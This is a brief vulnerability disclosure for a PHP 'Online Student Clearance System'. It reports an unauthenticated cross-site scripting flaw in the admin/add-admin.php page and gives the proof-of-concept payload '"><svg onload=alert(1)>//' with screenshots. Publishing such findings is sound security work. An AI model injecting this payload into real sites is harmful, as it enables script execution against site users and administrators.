The Online Student Clearance System has an xss vulnerability. Attackers can exploit this vulnerability without authentication, thereby affecting the normal function.





Source code address：https://www.sourcecodester.com/php/17892/online-clearance-system.html









Vulnerability verification：

```
http://192.168.1.8:80/student_clearance/admin/add-admin.php

"><svg onload=alert(1)>//
```

 ![image-20250427212250567](images/image-20250427212250567.png)



Insert payload："><svg onload=alert(1)>//

![image-20250427212306372](images/image-20250427212306372.png)





























